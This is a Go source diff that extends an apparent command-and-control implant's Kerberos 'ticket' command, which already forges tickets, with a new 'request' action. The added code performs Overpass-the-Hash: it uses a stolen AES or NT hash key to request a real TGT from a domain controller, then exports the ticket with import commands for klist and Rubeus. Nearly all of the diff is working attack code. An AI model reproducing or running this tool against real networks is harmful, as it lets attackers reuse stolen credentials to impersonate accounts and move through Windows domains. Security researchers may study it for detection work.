@@ -7,6 +7,8 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"io"
+	"net"
 	"strings"
 	"time"
 
@@ -14,6 +16,7 @@ import (
 
 	"github.com/jcmturner/gofork/encoding/asn1"
 	"github.com/jcmturner/gokrb5/v8/asn1tools"
+	"github.com/jcmturner/gokrb5/v8/config"
 	"github.com/jcmturner/gokrb5/v8/crypto"
 	"github.com/jcmturner/gokrb5/v8/iana"
 	"github.com/jcmturner/gokrb5/v8/iana/asnAppTag"
@@ -31,17 +34,18 @@ func (c *TicketCommand) Description() string {
 }
 
 type ticketArgs struct {
-	Action   string `json:"action"`    // forge
-	Realm    string `json:"realm"`     // domain (e.g., CORP.LOCAL)
-	Username string `json:"username"`  // target identity (e.g., Administrator)
-	UserRID  int    `json:"user_rid"`  // RID (default: 500 for Administrator)
+	Action    string `json:"action"`     // forge, request
+	Realm     string `json:"realm"`      // domain (e.g., CORP.LOCAL)
+	Username  string `json:"username"`   // target identity (e.g., Administrator)
+	UserRID   int    `json:"user_rid"`   // RID (default: 500 for Administrator)
 	DomainSID string `json:"domain_sid"` // domain SID (e.g., S-1-5-21-...)
-	Key      string `json:"key"`       // hex AES256 or NT hash key
-	KeyType  string `json:"key_type"`  // aes256, aes128, rc4 (default: aes256)
-	KVNO     int    `json:"kvno"`      // key version number (default: 2)
-	Lifetime int    `json:"lifetime"`  // ticket lifetime in hours (default: 24)
-	Format   string `json:"format"`    // kirbi, ccache (default: kirbi)
-	SPN      string `json:"spn"`       // for Silver Ticket: service/host
+	Key       string `json:"key"`        // hex AES256 or NT hash key
+	KeyType   string `json:"key_type"`   // aes256, aes128, rc4 (default: aes256)
+	KVNO      int    `json:"kvno"`       // key version number (default: 2)
+	Lifetime  int    `json:"lifetime"`   // ticket lifetime in hours (default: 24)
+	Format    string `json:"format"`     // kirbi, ccache (default: kirbi)
+	SPN       string `json:"spn"`        // for Silver Ticket: service/host
+	Server    string `json:"server"`     // KDC address for request action (e.g., dc01.corp.local)
 }
 
 func (c *TicketCommand) Execute(task structs.Task) structs.CommandResult {
@@ -65,9 +69,11 @@ func (c *TicketCommand) Execute(task structs.Task) structs.CommandResult {
 	switch strings.ToLower(args.Action) {
 	case "forge":
 		return ticketForge(args)
+	case "request":
+		return ticketRequest(args)
 	default:
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: forge", args.Action),
+			Output:    fmt.Sprintf("Unknown action: %s. Use: forge, request", args.Action),
 			Status:    "error",
 			Completed: true,
 		}
@@ -464,6 +470,350 @@ func ticketToCCache(ticketBytes []byte, sessionKey types.EncryptionKey, username
 	buf = binary.BigEndian.AppendUint32(buf, 0)
 
 	return buf
+}
+
+// ticketRequest performs an AS exchange (Overpass-the-Hash / Pass-the-Key) to obtain
+// a real TGT from the KDC using an extracted Kerberos key. The resulting TGT can be
+// exported as kirbi or ccache and injected via klist import. (T1550.002)
+func ticketRequest(args ticketArgs) structs.CommandResult {
+	if args.Realm == "" || args.Username == "" || args.Key == "" || args.Server == "" {
+		return structs.CommandResult{
+			Output:    "Error: realm, username, key, and server (KDC) are required for request",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	realm := strings.ToUpper(args.Realm)
+	if args.Format == "" {
+		args.Format = "kirbi"
+	}
+	if args.KeyType == "" {
+		args.KeyType = "aes256"
+	}
+
+	// Parse key
+	keyBytes, err := hex.DecodeString(args.Key)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error decoding key hex: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	var etypeID int32
+	var etypeCfgName string
+	switch strings.ToLower(args.KeyType) {
+	case "aes256":
+		etypeID = 18
+		etypeCfgName = "aes256-cts-hmac-sha1-96"
+		if len(keyBytes) != 32 {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error: AES256 key must be 32 bytes, got %d", len(keyBytes)),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+	case "aes128":
+		etypeID = 17
+		etypeCfgName = "aes128-cts-hmac-sha1-96"
+		if len(keyBytes) != 16 {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error: AES128 key must be 16 bytes, got %d", len(keyBytes)),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+	case "rc4", "ntlm":
+		etypeID = 23
+		etypeCfgName = "rc4-hmac"
+		if len(keyBytes) != 16 {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error: RC4/NTLM key must be 16 bytes, got %d", len(keyBytes)),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+	default:
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: unknown key_type %q. Use: aes256, aes128, rc4", args.KeyType),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	userKey := types.EncryptionKey{
+		KeyType:  etypeID,
+		KeyValue: keyBytes,
+	}
+
+	// Resolve KDC address
+	kdcAddr := args.Server
+	if !strings.Contains(kdcAddr, ":") {
+		kdcAddr += ":88"
+	}
+
+	// Create gokrb5 config
+	cfgStr := fmt.Sprintf("[libdefaults]\n  default_realm = %s\n  dns_lookup_kdc = false\n  dns_lookup_realm = false\n  default_tkt_enctypes = %s\n  default_tgs_enctypes = %s\n[realms]\n  %s = {\n    kdc = %s\n  }\n",
+		realm, etypeCfgName, etypeCfgName, realm, kdcAddr)
+	cfg, err := config.NewFromString(cfgStr)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error creating Kerberos config: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Build AS-REQ
+	cname := types.PrincipalName{
+		NameType:   nametype.KRB_NT_PRINCIPAL,
+		NameString: []string{args.Username},
+	}
+	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error building AS-REQ: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Force our etype
+	asReq.ReqBody.EType = []int32{etypeID}
+
+	// Add PA-ENC-TIMESTAMP pre-authentication
+	paTS := types.PAEncTSEnc{
+		PATimestamp: time.Now().UTC(),
+	}
+	paTSBytes, err := asn1.Marshal(paTS)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error marshaling PA-ENC-TIMESTAMP: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	encTS, err := crypto.GetEncryptedData(paTSBytes, userKey, keyusage.AS_REQ_PA_ENC_TIMESTAMP, 0)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error encrypting PA-ENC-TIMESTAMP: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	encTSBytes, err := asn1.Marshal(encTS)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error marshaling encrypted timestamp: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	asReq.PAData = types.PADataSequence{
+		{PADataType: 2, PADataValue: encTSBytes}, // PA-ENC-TIMESTAMP
+	}
+
+	// Marshal AS-REQ
+	reqBytes, err := asReq.Marshal()
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error marshaling AS-REQ: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Send over TCP to KDC
+	conn, err := net.DialTimeout("tcp", kdcAddr, 10*time.Second)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error connecting to KDC %s: %v", kdcAddr, err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(15 * time.Second))
+
+	// TCP Kerberos framing: 4-byte big-endian length prefix
+	lenBuf := make([]byte, 4)
+	binary.BigEndian.PutUint32(lenBuf, uint32(len(reqBytes)))
+	if _, err := conn.Write(lenBuf); err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error sending to KDC: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	if _, err := conn.Write(reqBytes); err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error sending AS-REQ: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Read response
+	if _, err := io.ReadFull(conn, lenBuf); err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error reading KDC response length: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	respLen := binary.BigEndian.Uint32(lenBuf)
+	if respLen > 1048576 {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: KDC response too large (%d bytes)", respLen),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	respBuf := make([]byte, respLen)
+	if _, err := io.ReadFull(conn, respBuf); err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error reading KDC response: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Check if response is KRB-ERROR ([APPLICATION 30] = 0x7e)
+	if len(respBuf) > 0 && respBuf[0] == 0x7e {
+		var krbErr messages.KRBError
+		if err := krbErr.Unmarshal(respBuf); err == nil {
+			errMsg := ticketKrbErrorMsg(krbErr.ErrorCode)
+			if krbErr.EText != "" {
+				errMsg += ": " + krbErr.EText
+			}
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("KDC error: %s (code %d)", errMsg, krbErr.ErrorCode),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+	}
+
+	// Parse AS-REP
+	var asRep messages.ASRep
+	if err := asRep.Unmarshal(respBuf); err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error parsing AS-REP: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Decrypt EncPart manually using crypto.DecryptEncPart
+	// (ASRep.DecryptEncPart requires credentials.Credentials, so we use the lower-level API)
+	plainBytes, err := crypto.DecryptEncPart(asRep.EncPart, userKey, 3) // key usage 3 = AS-REP EncPart
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error decrypting AS-REP (wrong key?): %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	var decPart messages.EncKDCRepPart
+	if err := decPart.Unmarshal(plainBytes); err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error parsing decrypted AS-REP: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Extract ticket info from decrypted AS-REP
+	sessionKey := decPart.Key
+	sname := decPart.SName
+	flags := decPart.Flags
+	authTime := decPart.AuthTime
+	endTime := decPart.EndTime
+	renewTill := decPart.RenewTill
+
+	// Export as kirbi or ccache
+	var output string
+	switch strings.ToLower(args.Format) {
+	case "kirbi":
+		kirbiBytes, err := ticketToKirbi(asRep.Ticket, sessionKey, args.Username, realm, sname, flags, authTime, endTime, renewTill)
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error creating kirbi: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		output = ticketRequestFormatOutput(args, realm, sessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(kirbiBytes))
+	case "ccache":
+		ticketBytes, err := asRep.Ticket.Marshal()
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error marshaling ticket: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		ccacheBytes := ticketToCCache(ticketBytes, sessionKey, args.Username, realm, sname, flags, authTime, endTime, renewTill)
+		output = ticketRequestFormatOutput(args, realm, sessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(ccacheBytes))
+	default:
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: unknown format %q. Use: kirbi, ccache", args.Format),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	return structs.CommandResult{
+		Output:    output,
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+func ticketRequestFormatOutput(args ticketArgs, realm string, sessionKey types.EncryptionKey, start, end time.Time, b64 string) string {
+	var sb strings.Builder
+	sb.WriteString("[*] TGT obtained via Overpass-the-Hash (AS-REQ)\n")
+	sb.WriteString(fmt.Sprintf("    User:      %s@%s\n", args.Username, realm))
+	sb.WriteString(fmt.Sprintf("    KDC:       %s\n", args.Server))
+	sb.WriteString(fmt.Sprintf("    Key Type:  %s (etype %d)\n", args.KeyType, sessionKey.KeyType))
+	sb.WriteString(fmt.Sprintf("    Valid:     %s — %s\n", start.Format("2006-01-02 15:04:05 UTC"), end.Format("2006-01-02 15:04:05 UTC")))
+	sb.WriteString(fmt.Sprintf("    Format:    %s\n", args.Format))
+	sb.WriteString(fmt.Sprintf("\n[+] Base64 %s ticket:\n%s\n", args.Format, b64))
+
+	if args.Format == "kirbi" {
+		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
+		sb.WriteString("[*] Or:     Rubeus.exe ptt /ticket:<base64>\n")
+	} else {
+		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
+		sb.WriteString("[*] Or:     echo '<base64>' | base64 -d > /tmp/krb5cc && export KRB5CCNAME=/tmp/krb5cc\n")
+	}
+
+	return sb.String()
+}
+
+func ticketKrbErrorMsg(code int32) string {
+	switch code {
+	case 6:
+		return "KDC_ERR_C_PRINCIPAL_UNKNOWN — client not found in Kerberos database"
+	case 12:
+		return "KDC_ERR_POLICY — KDC policy rejects request"
+	case 18:
+		return "KDC_ERR_CLIENT_REVOKED — account disabled or locked"
+	case 23:
+		return "KDC_ERR_KEY_EXPIRED — password/key has expired"
+	case 24:
+		return "KDC_ERR_PREAUTH_FAILED — wrong key or pre-authentication failed"
+	case 25:
+		return "KDC_ERR_PREAUTH_REQUIRED — pre-authentication required"
+	case 31:
+		return "KRB_AP_ERR_SKEW — clock skew too great between client and KDC"
+	case 68:
+		return "KDC_ERR_WRONG_REALM — wrong realm"
+	default:
+		return fmt.Sprintf("Kerberos error code %d", code)
+	}
 }
 
 func ccacheWritePrincipal(buf []byte, realm string, components []string) []byte {
